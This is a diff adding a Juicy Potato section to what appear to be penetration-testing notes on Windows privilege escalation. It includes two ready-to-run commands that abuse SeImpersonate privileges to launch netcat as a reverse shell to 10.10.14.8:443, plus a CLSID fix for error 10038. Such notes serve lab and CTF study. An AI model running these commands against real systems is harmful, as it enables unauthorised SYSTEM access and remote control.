@@ -670,6 +670,20 @@ One way to get hints can be by locating a script or log file that indicates a sc
 
 ## Juicy Potato
 
+We can execute JuicyPotato with the following example:
+
+```text
+./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c .\nc.exe -e cmd 10.10.14.8 443"
+```
+
+#### Error 10038
+
+This usually happens when the CLSID is not correct. As we know with the system that we are on a Windows 10 Enterprise machine, we can look for the correct CLSID in [Interesting CLSID](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md) we find the corresponding CLSID, and with the parameter -c:
+
+```text
+./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c .\nc.exe -e cmd 10.10.14.8 443" -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}"
+```
+
 ## Common Exploits
 
 [Juicy Potato](https://github.com/ohpe/juicy-potato) Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation
